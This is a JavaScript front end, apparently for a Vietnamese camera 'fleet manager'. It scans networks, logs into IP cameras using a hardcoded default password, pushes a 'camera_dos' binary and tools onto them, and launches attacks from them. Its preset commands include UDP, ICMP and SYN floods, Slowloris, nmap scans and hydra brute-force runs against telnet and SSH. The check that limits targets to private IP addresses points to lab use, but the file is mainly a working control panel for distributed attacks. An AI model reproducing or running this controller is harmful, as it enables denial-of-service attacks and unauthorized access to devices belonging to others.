import { createClient } from './api.js';
import { isIPv4OrCIDRv4, isPrivateIPv4 } from './config.js';
import * as UI from './ui.js';

const $ = (sel) => document.querySelector(sel);

let client = null;
let cameraStatus = {};
let binaryResults = [];
let savedCredentials = [];
let currentUser = null;
let deviceLocks = {};  // ip -> username

// -- button spam guard --
const _busy = {};
function guardBtn(key, btn) {
  if (_busy[key]) return false;
  _busy[key] = true;
  if (btn) btn.disabled = true;
  return true;
}
function releaseBtn(key, btn) {
  _busy[key] = false;
  if (btn) btn.disabled = false;
}

function showLogin() {
  $('#login-overlay').classList.remove('hidden');
  $('#login-overlay').hidden = false;
  $('#user-chip').hidden = true;
  $('#logout-btn').hidden = true;
}

function hideLogin(username) {
  currentUser = username;
  $('#login-overlay').classList.add('hidden');
  setTimeout(() => { $('#login-overlay').hidden = true; }, 300);
  const chip = $('#user-chip');
  chip.textContent = username;
  chip.hidden = false;
  $('#logout-btn').hidden = false;
}

async function init() {
  client = await createClient();

  client.on401(() => {
    currentUser = null;
    client.disconnect_ws();
    showLogin();
  });

  const me = await client.me();
  if (me) {
    hideLogin(me);
    client.connectStream();
  } else {
    showLogin();
  }

  $('#login-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = $('#login-user').value.trim();
    const pass = $('#login-pass').value;
    const errEl = $('#login-error');
    errEl.hidden = true;
    try {
      const r = await client.login(user, pass);
      if (r.ok) {
        hideLogin(r.username);
        client.connectStream();
        loadCredentials();
        loadStatus();
      } else {
        errEl.textContent = r.error || 'Sai tài khoản hoặc mật khẩu';
        errEl.hidden = false;
      }
    } catch {
      errEl.textContent = 'Không kết nối được server';
      errEl.hidden = false;
    }
  });

  $('#logout-btn').addEventListener('click', async () => {
    await client.logout();
    currentUser = null;
    client.disconnect_ws();
    showLogin();
  });

  client.onEvent(onEvent);

  UI.setupTheme();
  UI.setupSelectAll();
  UI.setupExecSelectAll();

  // scan
  $('#scan-btn').addEventListener('click', onScanStart);
  $('#scan-stop').addEventListener('click', onScanStop);

  // credential mode toggle
  document.querySelectorAll('input[name="cred-mode"]').forEach(r => {
    r.addEventListener('change', onCredModeChange);
  });

  // connect / disconnect
  $('#connect-btn').addEventListener('click', onConnect);
  $('#disconnect-btn').addEventListener('click', onDisconnectAll);

  // binary
  $('#check-btn').addEventListener('click', onCheckBinary);
  $('#deploy-all-btn').addEventListener('click', onDeployAll);
  $('#delete-all-btn').addEventListener('click', onDeleteAll);

  // exec
  $('#exec-btn').addEventListener('click', onExec);
  $('#exec-stop-btn').addEventListener('click', onExecStop);
  $('#exec-mode').addEventListener('change', onModeChange);
  onModeChange();
  document.querySelectorAll('input[name="exec-config"]').forEach(r => {
    r.addEventListener('change', onExecConfigChange);
  });

  // sidebar
  $('#sidebar-toggle').addEventListener('click', () => {
    $('#cmd-sidebar').classList.toggle('collapsed');
  });
  document.querySelectorAll('.cmd-item').forEach(el => {
    el.addEventListener('click', () => {
      const cmd = el.dataset.cmd;
      const mode = el.dataset.mode;
      if (mode) $('#exec-mode').value = mode;
      onModeChange();
      const cfgMode = document.querySelector('input[name="exec-config"]:checked')?.value;
      if (cfgMode === 'per-device') {
        UI.fillPerDeviceArgs(cmd);
      } else {
        $('#exec-args').value = cmd;
      }
      el.classList.add('copied');
      setTimeout(() => el.classList.remove('copied'), 1200);
    });
  });

  // credential DB
  $('#db-refresh').addEventListener('click', loadCredentials);
  $('#db-add').addEventListener('click', onAddCred);
  document.addEventListener('click', onTableClick);

  // collapsible sections
  $('#db-toggle').addEventListener('click', () => {
    $('#db-body-wrap').classList.toggle('collapsed-body');
    $('#db-arrow').classList.toggle('collapsed');
  });
  $('#log-toggle').addEventListener('click', () => {
    $('#console').classList.toggle('collapsed-body');
    $('#log-arrow').classList.toggle('collapsed');
  });

  // log
  $('#log-clear').addEventListener('click', UI.clearLog);

  // initial data load (only if already logged in)
  if (currentUser) {
    loadCredentials();
    loadStatus();
  }
}

// ---------------------------------------------------------------- events
function onEvent(msg) {
  if (msg.type === 'status' && msg.module === '_conn') {
    UI.updateConnChip(msg.state);
    return;
  }
  if (msg.type === 'log') {
    UI.appendLog(msg.module, msg.level, msg.text);
    if (msg.module === 'deploy' && msg.text) {
      const t = msg.text;
      if (t.includes('wget') || t.includes('Tải') || t.includes('giải nén') || t.includes('Dọn dẹp') || t.includes('Stream'))
        UI.showBinaryToast(t);
      else if (t.includes('thành công') || t.includes('Đã xóa'))
        UI.showBinaryToast(t, 'ok', 4000);
      else if (t.includes('thất bại'))
        UI.showBinaryToast(t, 'error', 5000);
    }
    if (msg.module === 'scan_ip' && msg.text) {
      const t = msg.text;
      if (t.includes('nmap') || t.includes('Đang quét'))
        UI.showToast('scan-toast', t);
      else if (msg.level === 'ok')
        UI.showToast('scan-toast', t, 'ok', 5000);
      else if (msg.level === 'error')
        UI.showToast('scan-toast', t, 'error', 5000);
    }
    if (msg.module === 'connect' && msg.text) {
      const t = msg.text;
      if (t.includes('Đang kết nối'))
        UI.showToast('connect-toast', t);
      else if (t.includes('thành công') || t.includes('Kết nối xong'))
        UI.showToast('connect-toast', t, 'ok', 5000);
      else if (t.includes('thất bại') || msg.level === 'error')
        UI.showToast('connect-toast', t, 'error', 5000);
      else if (t.includes('Đã ngắt'))
        UI.showToast('connect-toast', t, 'ok', 4000);
    }
  }
  if (msg.type === 'result') {
    if (msg.module === 'scan_ip' && msg.data?.hosts) {
      UI.renderScanResults(msg.data.hosts, deviceLocks, currentUser);
      UI.showToast('scan-toast', `Tìm thấy ${msg.data.hosts.length} thiết bị`, 'ok', 5000);
    }
    if (msg.module === 'binary' && msg.data?.results) {
      binaryResults = msg.data.results;
      UI.renderBinaryStatus(binaryResults, cameraStatus);
    }
    if (msg.module === 'connect' && msg.data?.results) {
      const ok = msg.data.results.filter(r => r.ok).length;
      const total = msg.data.results.length;
      UI.showToast('connect-toast', `Kết nối xong: ${ok}/${total} thành công`, ok === total ? 'ok' : 'error', 5000);
      loadStatus();
    }
    if (msg.module === 'deploy' && msg.data?.results) {
      releaseBtn('deploy', $('#deploy-all-btn'));
      releaseBtn('delete', $('#delete-all-btn'));
      const ok = msg.data.results.filter(r => r.ok).length;
      const total = msg.data.results.length;
      UI.showBinaryToast(`Hoàn tất: ${ok}/${total} thành công`, ok === total ? 'ok' : 'error', 5000);
      onCheckBinary();
    }
  }
  if (msg.type === 'exec_monitor' && msg.data) {
    UI.updateMonitorPanel(msg.data, msg.duration || 0);
  }
  if (msg.type === 'exec_done') {
    UI.appendLog('exec', 'info', 'Phiên thực thi kết thúc');
    UI.showMonitorPanel(false);
  }
  if (msg.type === 'status' && msg.module === 'scan_ip') {
    if (msg.state === 'running') {
      $('#scan-btn').hidden = true;
      $('#scan-stop').hidden = false;
      UI.updateScanBadge('running', msg.summary);
    } else {
      $('#scan-btn').hidden = false;
      $('#scan-stop').hidden = true;
      UI.updateScanBadge('idle', msg.summary);
    }
  }
}

// ---------------------------------------------------------------- scan
async function onScanStart() {
  const btn = $('#scan-btn');
  if (!guardBtn('scan', btn)) return;
  const range = $('#scan-range').value.trim();
  if (!isIPv4OrCIDRv4(range)) {
    UI.appendLog('scan_ip', 'error', 'Dải IP không hợp lệ');
    releaseBtn('scan', btn);
    return;
  }
  UI.showToast('scan-toast', `Đang quét ${range}…`);
  try {
    await client.scanStart(range);
  } catch (e) {
    UI.appendLog('scan_ip', 'error', e.message || String(e));
    UI.showToast('scan-toast', e.message || String(e), 'error', 5000);
  }
  releaseBtn('scan', btn);
}

async function onScanStop() {
  try { await client.scanStop(); } catch {}
}

// ---------------------------------------------------------------- cred mode
function onCredModeChange() {
  const mode = document.querySelector('input[name="cred-mode"]:checked')?.value;
  $('#shared-creds').hidden = mode !== 'shared';
  $('#individual-creds').hidden = mode !== 'individual';
  $('#saved-creds').hidden = mode !== 'saved';

  if (mode === 'individual') {
    const ips = UI.getSelectedIPs();
    if (ips.length === 0) {
      UI.appendLog('connect', 'warn', 'Chọn ít nhất 1 IP từ bảng quét trước');
    }
    UI.renderIndividualCreds(ips);
  }
}

// ---------------------------------------------------------------- connect
async function onConnect() {
  const btn = $('#connect-btn');
  if (!guardBtn('connect', btn)) return;
  const mode = document.querySelector('input[name="cred-mode"]:checked')?.value;
  const selectedIPs = UI.getSelectedIPs();
  let cameras = [];

  if (mode === 'shared') {
    const user = $('#shared-user').value.trim() || 'root';
    const pass = $('#shared-pass').value;
    if (selectedIPs.length === 0) {
      UI.appendLog('connect', 'warn', 'Chọn ít nhất 1 IP từ bảng quét');
      releaseBtn('connect', btn);
      return;
    }
    cameras = selectedIPs.map(ip => ({ ip, username: user, password: pass }));
  } else if (mode === 'individual') {
    cameras = UI.getIndividualCreds();
    if (cameras.length === 0) {
      UI.appendLog('connect', 'warn', 'Chưa có camera nào trong danh sách');
      releaseBtn('connect', btn);
      return;
    }
  } else if (mode === 'saved') {
    if (selectedIPs.length > 0) {
      cameras = selectedIPs.map(ip => {
        const saved = savedCredentials.find(c => c.ip === ip);
        return saved ? { ip, username: saved.username, password: saved.password }
                     : { ip, username: 'root', password: 'vnpt@123' };
      });
    } else {
      cameras = savedCredentials.map(c => ({ ip: c.ip, username: c.username, password: c.password }));
    }
    if (cameras.length === 0) {
      UI.appendLog('connect', 'warn', 'Database trống — thêm credentials trước');
      releaseBtn('connect', btn);
      return;
    }
  }

  UI.appendLog('connect', 'info', `Đang kết nối ${cameras.length} camera…`);
  UI.showToast('connect-toast', `Đang kết nối ${cameras.length} camera…`);
  try {
    await client.connect(cameras);
  } catch (e) {
    UI.appendLog('connect', 'error', e.message || String(e));
    UI.showToast('connect-toast', e.message || String(e), 'error', 5000);
  }
  releaseBtn('connect', btn);
  loadStatus();
}

async function onDisconnectAll() {
  UI.showToast('connect-toast', 'Đang ngắt tất cả…');
  try {
    await client.disconnect();
    UI.appendLog('connect', 'info', 'Đã ngắt tất cả');
    UI.showToast('connect-toast', 'Đã ngắt tất cả', 'ok', 4000);
  } catch {}
  loadStatus();
}

// ---------------------------------------------------------------- binary
async function onCheckBinary() {
  const btn = $('#check-btn');
  if (!guardBtn('check', btn)) return;
  UI.appendLog('binary', 'info', 'Đang kiểm tra /tmp/camera_dos…');
  try {
    const r = await client.checkBinary();
    if (r.results) {
      binaryResults = r.results;
      UI.renderBinaryStatus(binaryResults, cameraStatus);
    }
  } catch (e) {
    UI.appendLog('binary', 'error', e.message || String(e));
  }
  releaseBtn('check', btn);
}

async function onDeployAll() {
  const btn = $('#deploy-all-btn');
  if (!guardBtn('deploy', btn)) return;
  const target = $('#deploy-target').value;
  const label = target === 'all' ? 'tất cả binary' : target;
  UI.showBinaryToast(`Đang deploy ${label}…`);
  if (target === 'camera_dos' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang deploy camera_dos…');
    try { await client.deploy(null, 'camera_dos'); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  if (target === 'camera-tools' || target === 'all') {
    UI.showBinaryToast('Đang deploy camera-tools (tải + giải nén)…');
    UI.appendLog('deploy', 'info', 'Đang deploy camera-tools (tar.gz)…');
    try { await client.deployTools(null); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  releaseBtn('deploy', btn);
  setTimeout(() => { releaseBtn('check', $('#check-btn')); onCheckBinary(); }, 2000);
}

async function onDeleteAll() {
  const btn = $('#delete-all-btn');
  if (!guardBtn('delete', btn)) return;
  const target = $('#deploy-target').value;
  const label = target === 'all' ? 'tất cả binary' : target;
  if (!confirm(`Xóa ${label} trên tất cả camera?`)) { releaseBtn('delete', btn); return; }
  UI.showBinaryToast(`Đang xóa ${label}…`);
  if (target === 'camera_dos' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang xóa camera_dos…');
    try { await client.deleteBinary(null, 'camera_dos'); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  if (target === 'camera-tools' || target === 'all') {
    UI.appendLog('deploy', 'info', 'Đang xóa camera-tools…');
    try { await client.deleteTools(null); } catch (e) {
      UI.appendLog('deploy', 'error', e.message || String(e));
    }
  }
  releaseBtn('delete', btn);
  setTimeout(() => { releaseBtn('check', $('#check-btn')); onCheckBinary(); }, 1000);
}

// ---------------------------------------------------------------- exec
const PRESETS = {
  dos: [
    { label: 'UDP 100pps', args: '--udp-flood --udp-threads 1 --udp-rate 100 --udp-payload raw --udp-port 514' },
    { label: 'UDP max', args: '--udp-flood --udp-threads 9 --udp-rate 0 --udp-payload raw --udp-port 514' },
    { label: 'ICMP 100pps', args: '--icmp-flood --icmp-threads 2 --icmp-rate 100 --icmp-size 64' },
    { label: 'SYN flood', args: '--connections 500 --synflood --synflood-threads 20 --synflood-rate 0' },
    { label: 'Slowloris HTTP', args: '80 --connections 50 --dribble 5 --proto http' },
  ],
  recon: [
    { label: 'Ping sweep', args: '--timeout 30 fping -a -q -g 192.168.1.1 192.168.1.254' },
    { label: 'TCP scan', args: '--timeout 60 nmap -sT -Pn -n -p 22,23,80,443,554,8080 --max-retries 1 192.168.1.28' },
    { label: 'Top 100', args: '--timeout 120 nmap -sT -Pn -n --top-ports 100 --max-retries 1 192.168.1.28' },
    { label: 'UDP scan', args: '--timeout 60 nmap -sU -Pn -n -p 53,67,123,161,554,1900 --max-retries 1 192.168.1.28' },
    { label: 'Inspect', args: '--inspect' },
  ],
  brute: [
    { label: 'Telnet test', args: '--timeout 120 hydra -l root -p vnpt@123 -t 1 -w 5 telnet://192.168.1.28:23' },
    { label: 'SSH test', args: '--timeout 120 hydra -l root -p root -t 1 -w 5 ssh://192.168.1.28:22' },
    { label: 'SSH files', args: '--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 ssh://192.168.1.28:22' },
    { label: 'Telnet files', args: '--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 telnet://192.168.1.28:23' },
  ],
};

function onModeChange() {
  const mode = $('#exec-mode').value;
  const cfgMode = document.querySelector('input[name="exec-config"]:checked')?.value;
  const targetWrap = $('#exec-target-wrap');
  if (mode === 'dos') {
    targetWrap.hidden = false;
  } else {
    targetWrap.hidden = true;
  }
  if (mode === 'dos') {
    $('#exec-args').placeholder = '--udp-flood --udp-threads 10 --udp-rate 0 --udp-port 514';
  } else {
    $('#exec-args').placeholder = mode === 'recon'
      ? '--timeout 60 nmap -sT -Pn -n -p 22,80,443 192.168.1.28'
      : '--timeout 120 hydra -l root -p vnpt@123 -t 1 telnet://192.168.1.28';
  }
  const bar = $('#exec-presets');
  bar.innerHTML = '';
  (PRESETS[mode] || []).forEach(p => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'preset-btn';
    btn.textContent = p.label;
    btn.addEventListener('click', () => { $('#exec-args').value = p.args; });
    bar.appendChild(btn);
  });
  if (cfgMode === 'per-device') {
    UI.renderPerDeviceCameras(cameraStatus, binaryResults, '', mode);
    renderPdPresets(mode);
  }
}

function onExecConfigChange() {
  const cfgMode = document.querySelector('input[name="exec-config"]:checked')?.value;
  const mode = $('#exec-mode').value;
  $('#exec-shared-config').hidden = cfgMode !== 'all';
  $('#exec-per-device-config').hidden = cfgMode !== 'per-device';
  if (cfgMode === 'per-device') {
    UI.renderPerDeviceCameras(cameraStatus, binaryResults, $('#exec-args').value, mode);
    renderPdPresets(mode);
  }
}

function renderPdPresets(mode) {
  const bar = $('#exec-pd-presets');
  if (!bar) return;
  bar.innerHTML = '';
  (PRESETS[mode] || []).forEach(p => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'preset-btn';
    btn.textContent = p.label;
    btn.addEventListener('click', () => { UI.fillPerDeviceArgs(p.args); });
    bar.appendChild(btn);
  });
}

async function onExec() {
  const btn = $('#exec-btn');
  if (!guardBtn('exec', btn)) return;
  const mode = $('#exec-mode').value;
  const target = $('#exec-target').value.trim();
  const cfgMode = document.querySelector('input[name="exec-config"]:checked')?.value;

  if (mode === 'dos') {
    if (!target || !isPrivateIPv4(target)) {
      UI.appendLog('exec', 'error', 'IP mục tiêu không hợp lệ hoặc ngoài RFC1918');
      releaseBtn('exec', btn); return;
    }
  }

  if (cfgMode === 'per-device') {
    const perDevice = UI.getPerDeviceConfigs();
    if (perDevice.length === 0) {
      UI.appendLog('exec', 'error', 'Chưa có camera nào trong danh sách');
      releaseBtn('exec', btn); return;
    }
    const noArgs = perDevice.filter(d => !d.args);
    if (noArgs.length > 0) {
      UI.appendLog('exec', 'error', `Camera ${noArgs.map(d => d.ip).join(', ')} chưa có tham số`);
      releaseBtn('exec', btn); return;
    }
    const modeLabel = mode === 'dos' ? 'camera_dos' : 'camera-tools';
    UI.appendLog('exec', 'warn', `Chạy ${modeLabel} trên ${perDevice.length} camera (per-device config)`);
    try {
      const result = await client.exec(null, target, '', mode, 0, perDevice);
      const failed = (result.results || []).filter(item => !item.ok);
      failed.forEach(item => UI.appendLog('exec', 'error', `${item.ip}: ${item.msg}`));
      if (result.accepted && (result.results || []).some(item => item.ok)) {
        UI.showMonitorPanel(true);
      }
    } catch (e) {
      UI.appendLog('exec', 'error', e.message || String(e));
    } finally {
      releaseBtn('exec', btn);
    }
    return;
  }

  const args = $('#exec-args').value.trim();
  const duration = parseInt($('#exec-duration').value) || 0;

  if (!args) {
    UI.appendLog('exec', 'error', 'Chưa nhập tham số lệnh');
    releaseBtn('exec', btn); return;
  }

  const selectedIPs = UI.getSelectedExecIPs();
  const ips = selectedIPs.length > 0 ? selectedIPs : null;
  const label = ips ? `${ips.length} camera đã chọn` : 'tất cả camera';
  const modeLabel = mode === 'dos' ? 'camera_dos' : 'camera-tools';
  const durLabel = duration > 0 ? ` (${duration}s)` : '';
  UI.appendLog('exec', 'warn', `Chạy ${modeLabel} trên ${label}${durLabel} → ${mode === 'dos' ? target + ' ' : ''}${args}`);
  try {
    const result = await client.exec(ips, target, args, mode, duration);
    const failed = (result.results || []).filter(item => !item.ok);
    failed.forEach(item => UI.appendLog('exec', 'error', `${item.ip}: ${item.msg}`));
    if (result.accepted && (result.results || []).some(item => item.ok)) {
      UI.showMonitorPanel(true);
    }
  } catch (e) {
    UI.appendLog('exec', 'error', e.message || String(e));
  } finally {
    releaseBtn('exec', btn);
  }
}

async function onExecStop() {
  const btn = $('#exec-stop-btn');
  if (!guardBtn('execstop', btn)) return;
  const selectedIPs = UI.getSelectedExecIPs();
  const ips = selectedIPs.length > 0 ? selectedIPs : null;
  const label = ips ? `${ips.length} camera đã chọn` : 'tất cả';
  UI.appendLog('exec', 'info', `Dừng tất cả tiến trình trên ${label}…`);
  try { await client.execStop(ips); } catch {}
  UI.showMonitorPanel(false);
  releaseBtn('execstop', btn);
}

// ---------------------------------------------------------------- credentials DB
async function loadCredentials() {
  try {
    const r = await client.credentials();
    savedCredentials = r.credentials || [];
    UI.renderCredentials(savedCredentials);
  } catch {}
}

async function onAddCred() {
  const entry = UI.promptAddCred();
  if (!entry) return;
  try {
    await client.saveCred(entry);
    loadCredentials();
  } catch {}
}

// ---------------------------------------------------------------- table button clicks
function onTableClick(e) {
  const btn = e.target.closest('button');
  if (!btn || btn.disabled) return;

  if (btn.classList.contains('del-bin')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    UI.showBinaryToast(`Đang xóa camera_dos trên ${ip}…`);
    client.deleteBinary([ip], 'camera_dos').then(() => onCheckBinary()).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('deploy-bin')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    UI.showBinaryToast(`Đang deploy camera_dos lên ${ip}…`);
    client.deploy([ip], 'camera_dos').then(() => setTimeout(onCheckBinary, 2000)).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('del-tools')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    UI.showBinaryToast(`Đang xóa camera-tools trên ${ip}…`);
    client.deleteTools([ip]).then(() => onCheckBinary()).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('deploy-tools')) {
    btn.disabled = true;
    const ip = btn.dataset.ip;
    UI.showBinaryToast(`Đang deploy camera-tools lên ${ip}…`);
    client.deployTools([ip]).then(() => setTimeout(onCheckBinary, 3000)).finally(() => { btn.disabled = false; });
  }
  if (btn.classList.contains('del-cred')) {
    const ip = btn.dataset.ip;
    if (confirm(`Xóa credential cho ${ip}?`)) {
      btn.disabled = true;
      client.deleteCred(ip).then(() => loadCredentials()).finally(() => { btn.disabled = false; });
    }
  }
}

// ---------------------------------------------------------------- status polling
async function loadStatus() {
  try {
    const [r, dl] = await Promise.all([client.status(), client.deviceLocks()]);
    cameraStatus = r.cameras || {};
    deviceLocks = dl.locks || {};
    const me = dl.me || currentUser;
    UI.updateCamCount(r.connected_count || 0);
    UI.renderBinaryStatus(binaryResults, cameraStatus);
    UI.renderExecCameras(cameraStatus, binaryResults, deviceLocks, me);
  } catch {}
}

// refresh status every 5s (skip if not logged in)
setInterval(() => { if (currentUser) loadStatus(); }, 5000);

init();
